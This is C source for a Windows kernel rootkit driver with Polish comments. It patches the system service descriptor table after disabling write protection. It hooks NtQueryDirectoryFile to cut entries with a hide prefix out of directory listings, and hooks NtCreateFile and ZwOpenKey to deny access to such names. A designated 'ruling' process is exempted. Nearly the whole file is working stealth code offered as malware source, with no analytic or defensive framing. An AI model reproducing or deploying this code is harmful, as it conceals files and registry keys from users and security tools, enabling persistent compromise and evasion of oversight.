
#include <ntddk.h>
#include "rk_hook.h"
#include "rk_DKOM.h"
#include "rootkit.h"
#include "rk_Tools.h"


extern API_INDEXES    currentAPI;
extern NTOSKRNL_OFFSETS	offsets;
extern UNICODE_STRING hidePrefixW;
extern char *hidePrefixA;
extern char *rulingProcess;

NTQUERYDIRECTORYFILE		OldNtQueryDirectoryFile = NULL;
NTCREATEFILE				OldNtCreateFile;
ZWOPENKEY                   OldZwOpenKey;
ZWENUMERATEKEY              OldNtEnumerateKey;

BOOLEAN bHooked = FALSE;

//NTSTATUS NewZwQueryDirectoryFile(
//	IN HANDLE hFile,
//	IN HANDLE hEvent OPTIONAL,
//	IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
//	IN PVOID IoApcContext OPTIONAL,
//	OUT PIO_STATUS_BLOCK pIoStatusBlock,
//	OUT PVOID FileInformationBuffer,
//	IN ULONG FileInformationBufferLength,
//	IN FILE_INFORMATION_CLASS FileInfoClass,
//	IN BOOLEAN bReturnOnlyOneEntry,
//	IN PUNICODE_STRING PathMask OPTIONAL,
//	IN BOOLEAN bRestartQuery
//);

/*
* Zalozenie hookow na okreslone funkcje w tablicy SSDT.
* Przechwytujemy wywolania funkcji (us³ug systemowych):
* - NtCreateFile 
* - NtQueryDirectoryFile                   
* - NtOpenKey
*/
VOID HookApis()
{
	KIRQL irql;

	if (!bHooked)
	{
		irql = RaiseIRQLevel();

		WPOFF();
		DbgPrint("rootkit: Hookowanie tablicy SSDT\n");
		// NtCreateFile
		OldNtCreateFile	= SYSCALL( currentAPI.NtCreateFileIndex );
		SYSCALL( currentAPI.NtCreateFileIndex ) = HookNtCreateFile;

		// NtQueryDirectoryFile
		OldNtQueryDirectoryFile	= SYSCALL( currentAPI.NtQueryDirectoryFileIndex );
		SYSCALL( currentAPI.NtQueryDirectoryFileIndex ) = HookNtQueryDirectoryFile;

//        OldZwOpenKey = SYSTEMSERVICE(ZwOpenKey);
//        SYSTEMSERVICE( ZwOpenKey ) = HookZwOpenKey; 
        
        OldNtEnumerateKey = SYSTEMSERVICE(ZwEnumerateKey);
        SYSTEMSERVICE( ZwEnumerateKey ) = HookNtEnumerateKey; 

		bHooked = TRUE;
		WPON();

		LowerIRQLevel( irql );
    }
}

/*
*   Zdjecie hookow z tablicy SSDT.
*/
VOID UnHookApis()
{
	KIRQL irql;

	if (bHooked)
	{
 
		irql = RaiseIRQLevel();

		WPOFF();

		SYSCALL( currentAPI.NtCreateFileIndex ) = OldNtCreateFile;	
		SYSCALL( currentAPI.NtQueryDirectoryFileIndex ) = OldNtQueryDirectoryFile;	
		
//        SYSTEMSERVICE( ZwOpenKey ) = OldZwOpenKey;
        SYSTEMSERVICE( ZwEnumerateKey ) = OldNtEnumerateKey;        

		bHooked = FALSE;
		WPON();

		LowerIRQLevel( irql );
	}
}

NTSTATUS 
  HookNtEnumerateKey(
    IN HANDLE  KeyHandle,
    IN ULONG  Index,
    IN KEY_INFORMATION_CLASS  KeyInformationClass,
    OUT PVOID  KeyInformation,
    IN ULONG  Length,
    OUT PULONG  ResultLength
    )
{
  NTSTATUS rc;
  
  DbgPrint("ZwEnumerateKey");
  
  rc = OldNtEnumerateKey(
       KeyHandle,
       Index,
       KeyInformationClass,
       KeyInformation,
       Length,
       ResultLength
    );
    
     
  return rc;   
}

NTSTATUS 
HookZwOpenKey(
	PHANDLE phKey,
	ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes
    )
{
        int rc;
        WCHAR buf[1024]; 
        PEPROCESS currentEprocess = NULL;        
        
//        DbgPrint("Entered HookZwOpenKey\n");
        rc=((ZWOPENKEY)(OldZwOpenKey)) (
			phKey,
			DesiredAccess,
			ObjectAttributes );

	    //sprawdzenie nazwy/pidu procesu => szybsze wyjscie ? ;)
        currentEprocess = PsGetCurrentProcess();
        if (IsPriviligedProcess( currentEprocess ) ) {
	       return rc;
        }
			
        if (ObjectAttributes->ObjectName && ObjectAttributes->ObjectName->Buffer) { 
           DbgPrint( "objectName =  %S\n",ObjectAttributes->ObjectName->Buffer );
           if (ObjectAttributes->ObjectName->Length >= wcslen(hidePrefixW.Buffer ) ) 
              if (wcsstr(ObjectAttributes->ObjectName->Buffer,hidePrefixW.Buffer) != NULL) {
//              if (RtlCompareMemory( ObjectAttributes->ObjectName->Buffer, hidePrefixW.Buffer, wcslen(hidePrefixW.Buffer )) == wcslen(hidePrefixW.Buffer) )  {
//                 DbgPrint( "objectName =  %S\n",ObjectAttributes->ObjectName->Buffer );
                 return STATUS_ACCESS_DENIED;              
              }
        }
		
//        getFullPath( buf, sizeof(buf), ObjectAttributes);
//        DbgPrint("KEY: %S\n",buf);
		
//		DbgPrint("rootkit: ZwOpenKey : rc = %x, phKey = %X\n", rc, *phKey);
      
        return rc;
}

//--------------------------------------------------------------------------


NTSTATUS HookNtQueryDirectoryFile(
	IN HANDLE hFile,
	IN HANDLE hEvent OPTIONAL,
	IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
	IN PVOID IoApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK pIoStatusBlock,
	OUT PVOID FileInformationBuffer,
	IN ULONG FileInformationBufferLength,
	IN FILE_INFORMATION_CLASS FileInfoClass,
	IN BOOLEAN bReturnOnlyOneEntry,
	IN PUNICODE_STRING PathMask OPTIONAL,
	IN BOOLEAN bRestartQuery
)
{
	NTSTATUS rc;
	PCHAR processName = NULL;
	PEPROCESS currentEprocess = NULL;	
//	CHAR aProcessName[PROCNAMELEN];                                        
//		                                                                      
//	GetProcessName( aProcessName );                                        
//	DbgPrint("rootkit: NewZwQueryDirectoryFile() from %s\n", aProcessName);

	rc=OldNtQueryDirectoryFile(
			hFile,							/* this is the directory handle */
			hEvent,
			IoApcRoutine,
			IoApcContext,
			pIoStatusBlock,
			FileInformationBuffer,
			FileInformationBufferLength,
			FileInfoClass,
			bReturnOnlyOneEntry,
			PathMask,
			bRestartQuery);

	//sprawdzenie nazwy/pidu procesu => szybsze wyjscie ? ;)
	currentEprocess = PsGetCurrentProcess();
	if (IsPriviligedProcess( currentEprocess ) ) {
		return rc;
	}

	if( NT_SUCCESS( rc ) && 
		(FileInfoClass == FileDirectoryInformation ||
		 FileInfoClass == FileFullDirectoryInformation ||
		 FileInfoClass == FileIdFullDirectoryInformation ||
		 FileInfoClass == FileBothDirectoryInformation ||
		 FileInfoClass == FileIdBothDirectoryInformation ||
		 FileInfoClass == FileNamesInformation )
		) 
	{
			PVOID p = FileInformationBuffer;
			PVOID pLast = NULL;
			BOOLEAN bLastOne;
			do 
			{
				bLastOne = !getDirEntryLenToNext(p,FileInfoClass);
				
				// compare directory-name prefix with '_root_' to decide if to hide or not.

				if (getDirEntryFileLength(p,FileInfoClass) >= 8) {
					if( RtlCompareMemory( getDirEntryFileName(p,FileInfoClass), (PVOID)&hidePrefixW.Buffer[ 0 ], 8 ) == 8 ) 
					{
                        DbgPrint("rootkit: Chowam plik\n");
						if( bLastOne ) 
						{
							if( p == FileInformationBuffer ) rc = 0x80000006;
							else setDirEntryLenToNext(pLast,FileInfoClass, 0);
							break;
						} 
						else 
						{
							int iPos = ((ULONG)p) - (ULONG)FileInformationBuffer;
							int iLeft = (ULONG)FileInformationBufferLength - iPos - getDirEntryLenToNext(p,FileInfoClass);
							RtlCopyMemory( p, (PVOID)( (char *)p + getDirEntryLenToNext(p,FileInfoClass) ), (ULONG)iLeft );
							continue;
						}
					}
				}
				pLast = p;
				p = ((char *)p + getDirEntryLenToNext(p,FileInfoClass) );
			} while( !bLastOne );
	}
	return rc;
}

NTSTATUS HookNtCreateFile(
  PHANDLE FileHandle,
  ACCESS_MASK DesiredAccess,
  POBJECT_ATTRIBUTES ObjectAttributes,
  PIO_STATUS_BLOCK IoStatusBlock,
  PLARGE_INTEGER AllocationSize,
  ULONG FileAttributes,
  ULONG ShareAccess,
  ULONG CreateDisposition,
  ULONG CreateOptions,
  PVOID EaBuffer,
  ULONG EaLength
)
{

	PEPROCESS currentEprocess = NULL;

	goto pass_throught;

	currentEprocess = PsGetCurrentProcess();
	if (IsPriviligedProcess( currentEprocess ) ) {
		goto pass_throught;
	}

	if (  wcslen(hidePrefixW.Buffer ) <= ObjectAttributes->ObjectName->Length )
		if (RtlCompareMemory( ObjectAttributes->ObjectName->Buffer, hidePrefixW.Buffer, wcslen(hidePrefixW.Buffer )) ) 
//		if (wcsstr(ObjectAttributes->ObjectName->Buffer, hidePrefixW ))
		{	
			return STATUS_ACCESS_DENIED;
		}

pass_throught:

	return OldNtCreateFile(
					FileHandle,
					DesiredAccess,
					ObjectAttributes,
					IoStatusBlock,
					AllocationSize,
					FileAttributes,
					ShareAccess,
					CreateDisposition,
					CreateOptions,
					EaBuffer,
					EaLength);
}


BOOLEAN IsPriviligedProcess( PEPROCESS eproc ) 
{
	ULONG len = 0;
	PCHAR processName = NULL;
	if ( eproc ) {
		processName = (PCHAR) ( (ULONG)eproc + offsets.processName );
		if (processName) {
			len = strlen(rulingProcess);
			if ( RtlCompareMemory( processName, rulingProcess, len ) == len )
				return TRUE;
		}
	}
	return FALSE;
}
